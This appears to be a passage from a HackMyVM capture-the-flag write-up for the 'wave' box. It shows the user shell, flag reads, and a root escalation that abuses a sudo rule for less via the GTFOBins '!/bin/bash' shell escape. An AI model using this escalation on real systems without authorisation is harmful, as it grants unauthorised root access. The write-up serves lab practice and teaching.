Linux wave 6.1.0-11-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.38-4 (2023-08-08) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Sep  5 11:14:50 2023 from 192.168.0.100
```

![Victim: angie](https://img.shields.io/badge/Victim-angie-64b5f6?logo=linux&logoColor=white)

`whoami`:
```
angie ←
```

`cd /home/angie`

`ls -alps`:
```
total 688
  4 drwx------ 5 angie angie   4096 sep 23 16:14 ./
  4 drwxr-xr-x 4 root  root    4096 sep  4  2023 ../
  0 lrwxrwxrwx 1 angie angie      9 sep  4  2023 .bash_history -> /dev/null
  4 -rw-r--r-- 1 angie angie    220 sep  4  2023 .bash_logout
  4 -rw-r--r-- 1 angie angie   3526 sep  4  2023 .bashrc
632 -rw-r--r-- 1 angie angie 646042 sep  2  2023 copyparty-sfx.py
  4 drwxr-xr-x 2 angie angie   4096 sep 23 16:29 .hist/
  4 drwxr-xr-x 3 angie angie   4096 sep  4  2023 .local/
  4 -rw-r--r-- 1 angie angie    807 sep  4  2023 .profile
  4 -rw-r--r-- 1 angie angie     66 sep  4  2023 .selected_editor
  4 drwxr-xr-x 2 angie angie   4096 sep 23 16:28 .ssh/
  4 -rw------- 1 angie angie     24 sep  4  2023 user.txt ←
  4 -rw-r--r-- 1 angie angie    165 sep  4  2023 .wget-hsts
  4 -rw------- 1 angie angie     50 sep  5  2023 .Xauthority
```

`cat ./user.txt`:
```
HMVIdsEwudDxJDSaue32DJa ←
```

`sudo -l`:
```
Matching Defaults entries for angie on wave:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User angie may run the following commands on wave:
    (ALL) NOPASSWD: /usr/bin/less -F /opt/secret.txt ←
```

`/usr/bin/less -F /opt/secret.txt`:
```
Dietro di lui, 
dietro di lui solo la nebbia.
```

<div>
	<img src="./assets/logo_gtfobins.png" alt="GTFOBins Logo" width="16" height="auto">
	<span style="color: white; font-size: 110%;"><strong>GTFOBins</strong></span>
</div>

[less](https://gtfobins.github.io/gtfobins/less)

[**#Sudo**]

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.
```
sudo less /etc/profile
!/bin/sh ←
```

![Victim: angie](https://img.shields.io/badge/Victim-angie-64b5f6?logo=linux&logoColor=white)

`stty rows 2 cols 100`

`sudo /usr/bin/less -F /opt/secret.txt`

`!/bin/bash`

![Victim: root](https://img.shields.io/badge/Victim-root-64b5f6?logo=linux&logoColor=white)

`whoami`:
```
root ←
```

`cd /root`

`ls -alps`:
```
total 32                                       
4 drwx------  4 root root 4096 sep 23 16:39 ./ 
4 drwxr-xr-x 18 root root 4096 sep  4  2023 ../
0 lrwxrwxrwx  1 root root    9 sep  4  2023 .bash_history -> /dev/null
4 -rw-r--r--  1 root root  571 abr 10  2021 .bashrc
4 -rw-------  1 root root   20 sep 23 16:39 .lesshst
4 drwxr-xr-x  3 root root 4096 sep  4  2023 .local/
4 -rw-r--r--  1 root root  161 jul  9  2019 .profile
4 -rw-------  1 root root   22 sep  4  2023 root.txt ←
4 drwx------  2 root root 4096 sep  4  2023 .ssh/
```

`cat ./root.txt`:
```
HMVNVJrewoiu47rewFDSR ←
```

<img src="https://hackmyvm.eu/img/correctflag.png" alt="Machine Hacked!" width="150"/>

---
---
